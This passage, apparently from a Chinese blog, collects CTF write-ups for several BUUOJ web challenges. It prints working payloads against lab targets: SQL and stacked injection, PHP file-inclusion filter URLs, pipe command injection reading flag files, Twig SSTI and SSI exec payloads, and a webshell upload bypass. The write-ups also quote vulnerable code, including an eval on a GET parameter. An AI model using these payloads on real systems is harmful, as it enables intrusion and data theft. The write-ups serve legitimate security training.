words;–+</p><p>)</p><p>改完后输入：1’ or 1=1 –+即可查到flag</p><p><img src="../../../../img/image-20200723141800578.png" alt="image-20200723141800578"></p><p>堆叠注入：<a href="https://www.cnblogs.com/0nth3way/articles/7128189.html" target="_blank" rel="noopener">https://www.cnblogs.com/0nth3way/articles/7128189.html</a></p><p><strong>方法二</strong></p><p>用handler语句代替select，具体见本篇[GYCTF2020]Blacklist</p><pre class=" language-php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//ecaf9ef5-ff55-4a72-b878-6fe965d670f6.node3.buuoj.cn/?inject=1';handler `1919810931114514` open; handler `1919810931114514` read first; --+</span></code></pre><h2 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h2><p><img src="../../../../img/image-20200723141847958.png" alt="image-20200723141847958"></p><p>三种查询结果：</p><p><img src="../../../../img/clip_image002.jpg" alt="img"></p><p><img src="../../../../img/clip_image004.jpg" alt="img"></p><p><img src="../../../../img/clip_image006.jpg" alt="img"></p><p><img src="../../../../img/clip_image008.jpg" alt="img"></p><p>可堆叠注入：1;show databases; show tables;</p><p>网上搜到原题泄露了查询语句：<code>select $_POST[query] || flag from flag</code></p><p>两种方法：</p><ol><li><p>*,1</p></li><li><p>1;set sql_mode=PIPES_AS_CONCAT;select 1</p></li></ol><p>解析：</p><ul><li>在oracle 缺省支持     通过 ‘ || ’ 来实现字符串拼接。</li><li>但在mysql 缺省不支持。需要调整mysql 的sql_mode<pre><code> 模式：pipes_as_concat 来实现oracle     的一些功能。</code></pre></li></ul><p>参考：<a href="https://blog.csdn.net/qq_42158602/article/details/103930598" target="_blank" rel="noopener">https://blog.csdn.net/qq_42158602/article/details/103930598</a></p><h2 id="NPUCTF2020-ezinclude"><a href="#NPUCTF2020-ezinclude" class="headerlink" title="[NPUCTF2020]ezinclude"></a>[NPUCTF2020]ezinclude</h2><p><img src="../../../../img/image-20200805231904896.png" alt="image-20200805231904896"></p><p>由注释可知为<a href="https://xz.aliyun.com/t/2563" target="_blank" rel="noopener">MD5哈希长度拓展攻击</a></p><p><img src="../../../../img/image-20200805232021063.png" alt="image-20200805232021063"></p><p>但是响应包已经返回hash，直接get提交参数path=fa25e54758d5d5c1927781a6ede89f8a，提交后重定向404</p><p><img src="../../../../img/image-20200805232331858.png" alt="image-20200805232331858"></p><p>点击堆栈追踪可看到代码</p><p><img src="../../../../img/image-20200805232412813.png" alt="image-20200805232412813"></p><p><code>view-source:http://6fae3651-6912-4405-8f69-92344febe91f.node3.buuoj.cn/flflflflag.php?file=php://filter/read=convert.base64-encode/resource=flflflflag.php</code> 读取文件</p><pre class=" language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">language</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>javascript<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>           window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href<span class="token operator">=</span><span class="token string">"404.html"</span><span class="token punctuation">;</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span></span>this_is_not_fl4g_and_åºé¢äºº_wants_girlfriend<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/data|input|zip/is'</span><span class="token punctuation">,</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'nonono'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>@<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">'include($_GET["file"])'</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span></code></pre><p>过滤了ls，data，input，没办法命令执行获取当前文件夹下的内容</p><h2 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h2><p><img src="../../../../img/image-20200807141720931.png" alt="image-20200807141720931"></p><blockquote><p><a href="http://f86e6a77-36b2-45db-ac74-9ba92c007216.node3.buuoj.cn/?file=php://filter/read=convert.base64-encode/resource=flag.php" target="_blank" rel="noopener">http://f86e6a77-36b2-45db-ac74-9ba92c007216.node3.buuoj.cn/?file=php://filter/read=convert.base64-encode/resource=flag.php</a></p><p>基本的文件包含</p></blockquote><h2 id="ACTF2020-新生赛-Upload"><a href="#ACTF2020-新生赛-Upload" class="headerlink" title="[ACTF2020 新生赛]Upload"></a>[ACTF2020 新生赛]Upload</h2><p>用bp绕过前端验证，上传一句话，发现php已进黑名单</p><p><img src="../../../../img/image-20200807143831219.png" alt="image-20200807143831219"></p><p>返回版本为5.6，改后缀为phtml绕过黑名单验证，成功上传，连接后在根目录发现flag</p><p><img src="../../../../img/image-20200807144032276.png" alt="image-20200807144032276"></p><h2 id="ACTF2020-新生赛-Exec"><a href="#ACTF2020-新生赛-Exec" class="headerlink" title="[ACTF2020 新生赛]Exec"></a>[ACTF2020 新生赛]Exec</h2><blockquote><p>命令执行中的<code>|</code></p><p>127.0.0.1 | ls ../../../</p><p>127.0.0.1 | cat ../../../flag</p></blockquote><h2 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h2><p><img src="../../../../img/image-20200912085834738.png" alt="image-20200912085834738"></p><p>响应头提示<code>select * from &#39;admin&#39; where password=md5($pass,true)</code></p><p><a href="https://www.jianshu.com/p/12125291f50d" target="_blank" rel="noopener">md5注入</a></p><blockquote><p>如果可选的 raw_output 被设置为 TRUE，那么 MD5 报文摘要将以16字节长度的原始二进制格式返回</p></blockquote><p>输入<code>ffifdyop</code>即可</p><p>进入下一页面，查看注释</p><pre class=" language-php"><code class="language-php"><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$GET</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">!=</span> <span class="token variable">$b</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// wow, glzjin wants a girl friend.</span></code></pre><p>数组绕过<code>http://2cef2e26-08ad-44ad-938c-10498dad8ab0.node3.buuoj.cn/levels91.php?a[]=1&amp;b[]=2</code></p><p>下一页面</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span> <span class="token string">"flag.php"</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'param1'</span><span class="token punctuation">]</span><span class="token operator">!==</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'param2'</span><span class="token punctuation">]</span><span class="token operator">&amp;&amp;</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'param1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'param2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>post数组绕过<code>param1[]=1&amp;param2[]=2</code></p><h2 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h2><p>显示网站界面，使用dirmap扫描到目录<code>http://02b87379-34da-48ba-8bf7-e98327689a95.node3.buuoj.cn/.git/config</code></p><p>有git泄露，使用githack得到源码（githack使用的是python2，而且有时候恢复地不全，需要多恢复几次）</p><blockquote><p>githack使用的是py2，推荐共存2和3的<a href="https://www.cnblogs.com/shabbylee/p/6792555.html" target="_blank" rel="noopener">文章</a></p></blockquote><p>flag.php</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string">'/flag'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>index.php</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">include</span> <span class="token string">'flag.php'</span><span class="token punctuation">;</span><span class="token variable">$yds</span> <span class="token operator">=</span> <span class="token string">"dog"</span><span class="token punctuation">;</span><span class="token variable">$is</span> <span class="token operator">=</span> <span class="token string">"cat"</span><span class="token punctuation">;</span><span class="token variable">$handsome</span> <span class="token operator">=</span> <span class="token string">'yds'</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_POST</span> <span class="token keyword">as</span> <span class="token variable">$x</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$y</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    $<span class="token variable">$x</span> <span class="token operator">=</span> <span class="token variable">$y</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token keyword">as</span> <span class="token variable">$x</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$y</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    $<span class="token variable">$x</span> <span class="token operator">=</span> $<span class="token variable">$y</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token keyword">as</span> <span class="token variable">$x</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$y</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'flag'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token variable">$x</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$x</span> <span class="token operator">!==</span> <span class="token string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token variable">$handsome</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'flag'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'flag'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token variable">$yds</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'flag'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string">'flag'</span>  <span class="token operator">||</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'flag'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token variable">$is</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">echo</span> <span class="token string">"the flag is: "</span><span class="token punctuation">.</span><span class="token variable">$flag</span><span class="token punctuation">;</span></code></pre><p>考察变量覆盖<code>http://2778652f-ca93-4bd4-a661-53f90a9abd3d.node3.buuoj.cn/?yds=flag</code></p><p>第二个foreach将$yds赋值为$flag，然后不设置post和get中的flag参数，就直接退出并返回$yds,也就是赋值的flag</p><h2 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h2><p><img src="../../../../img/image-20200916110059759.png" alt="image-20200916110059759"></p><p>查看hint</p><p><img src="../../../../img/image-20200916110022260.png" alt="image-20200916110022260"></p><p>获取ip的方式，网上有很多php获取ip的代码，大同小异，很多都获取了xxf和XFF或Client-IP这两个header作为ip，这两个都可以通过header伪造</p><p><img src="../../../../img/image-20200916110328359.png" alt="image-20200916110328359"></p><p>发现ssti</p><p><img src="../../../../img/image-20200916110423473.png" alt="image-20200916110423473"></p><p>获得flag</p><p><img src="../../../../img/image-20200916112411831.png" alt="image-20200916112411831"></p><h2 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h2><p><img src="../../../../img/image-20200916153437603.png" alt="image-20200916153437603"></p><p>hint</p><p><code>Why not take a closer look at cookies?</code></p><p>发现ssti</p><p><img src="../../../../img/v2-3321f46859c0be9e93f9ad79f3dd1cd3_1440w.jpg"></p><p><a href="https://zhuanlan.zhihu.com/p/28823933" target="_blank" rel="noopener">学习链接</a></p><p><img src="../../../../img/image-20200916153250680.png" alt="image-20200916153250680"></p><p>经测试为twig模板</p><pre class=" language-python"><code class="language-python">user<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">{</span>_self<span class="token punctuation">.</span>env<span class="token punctuation">.</span>registerUndefinedFilterCallback<span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token punctuation">{</span>_self<span class="token punctuation">.</span>env<span class="token punctuation">.</span>getFilter<span class="token punctuation">(</span><span class="token string">"cat /flag"</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>获得flag</p><p><img src="../../../../img/image-20200916170823820.png" alt="image-20200916170823820"></p><h2 id="BJDCTF2020-EasySearch"><a href="#BJDCTF2020-EasySearch" class="headerlink" title="[BJDCTF2020]EasySearch"></a>[BJDCTF2020]EasySearch</h2><p>访问index.php.swp获取源码</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token function">ob_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">get_hash</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$chars</span> <span class="token operator">=</span> <span class="token string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-'</span><span class="token punctuation">;</span>        <span class="token variable">$random</span> <span class="token operator">=</span> <span class="token variable">$chars</span><span class="token punctuation">[</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">73</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token variable">$chars</span><span class="token punctuation">[</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">73</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token variable">$chars</span><span class="token punctuation">[</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">73</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token variable">$chars</span><span class="token punctuation">[</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">73</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token variable">$chars</span><span class="token punctuation">[</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">73</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//Random 5 times</span>        <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">uniqid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token variable">$random</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Content-Type: text/html;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">''</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$admin</span> <span class="token operator">=</span> <span class="token string">'6d0bc1'</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token variable">$admin</span> <span class="token operator">==</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string">"&lt;script>alert('[+] Welcome to manage system')&lt;/script>"</span><span class="token punctuation">;</span>            <span class="token variable">$file_shtml</span> <span class="token operator">=</span> <span class="token string">"public/"</span><span class="token punctuation">.</span><span class="token function">get_hash</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">".shtml"</span><span class="token punctuation">;</span>            <span class="token variable">$shtml</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token variable">$file_shtml</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Unable to open file!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$text</span> <span class="token operator">=</span> '            <span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span>            <span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span>            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span></span>Hello<span class="token punctuation">,</span><span class="token string">'.$_POST['</span>username<span class="token string">'].'</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span></span>            <span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span>            <span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span>'<span class="token punctuation">;</span>            <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$shtml</span><span class="token punctuation">,</span><span class="token variable">$text</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$shtml</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span>            <span class="token keyword">echo</span> <span class="token string">"[!] Header  error ..."</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string">"&lt;script>alert('[!] Failed')&lt;/script>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span>    <span class="token punctuation">{</span>    <span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span>    <span class="token punctuation">}</span>    <span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token delimiter">?></span></code></pre><p>要满足密码md5加密后的前；六位等于<code>6d0bc1</code></p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> hashlibi<span class="token operator">=</span><span class="token number">0</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    md5 <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>str<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>    md5<span class="token operator">=</span>md5<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> md5<span class="token operator">==</span><span class="token string">"6d0bc1"</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>        <span class="token keyword">break</span>    i<span class="token operator">=</span>i<span class="token operator">+</span><span class="token number">1</span></code></pre><p>跑出密码<code>2020666</code></p><p>登录</p><p><img src="../../../../img/image-20200916181329097.png" alt="image-20200916181329097"></p><p><img src="../../../../img/image-20200916181253933.png" alt="image-20200916181253933"></p><p><a href="https://blog.csdn.net/qq_40657585/article/details/84260844" target="_blank" rel="noopener">ssi注入</a></p><p>将用户名改为<code>&lt;!--#exec cmd=&quot;ls ../&quot;--&gt;</code></p><p><img src="../../../../img/image-20200916181648989.png" alt="image-20200916181648989"></p><p><code>&lt;!--#exec cmd=&quot;cat ../flag_990c66bf85a09c664f0b6741840499b2&quot;--&gt;</code></p><p><img src="../../../../img/image-20200916181934904.png" alt="image-20200916181934904"></p><h2 id="BJDCTF2020-ZJCTF，不过如此"><a href="#BJDCTF2020-ZJCTF，不过如此" class="headerlink" title="[BJDCTF2020]ZJCTF，不过如此"></a>[BJDCTF2020]ZJCTF，不过如此</h2><p>得到代码</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$text</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"text"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token string">"I have a dream"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"&lt;br>&lt;h1>"</span><span class="token punctuation">.</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"&lt;/h1>&lt;/br>"</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/flag/"</span><span class="token punctuation">,</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Not now!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//next.php</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>使用data协议，filter协议</p><pre class=" language-php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//fcae7fc4-068a-42a8-850b-85af44432865.node3.buuoj.cn/?text=data://,I%20have%20a%20dream&amp;file=php://filter/read=convert.base64-encode/resource=next.php</span></code></pre><pre class=" language-php"><code class="language-php"><span class="token comment" spellcheck="true">//next.php</span><span class="token delimiter">&lt;?php</span><span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$id</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">complex</span><span class="token punctuation">(</span><span class="token variable">$re</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span>        <span class="token string">'/('</span> <span class="token punctuation">.</span> <span class="token variable">$re</span> <span class="token punctuation">.</span> <span class="token string">')/ei'</span><span class="token punctuation">,</span>        <span class="token string">'strtolower("\\1")'</span><span class="token punctuation">,</span>        <span class="token variable">$str</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token keyword">as</span> <span class="token variable">$re</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token function">complex</span><span class="token punctuation">(</span><span class="token variable">$re</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">.</span> <span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">getFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    @<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p><a href="https://xz.aliyun.com/t/2557#toc-0" target="_blank" 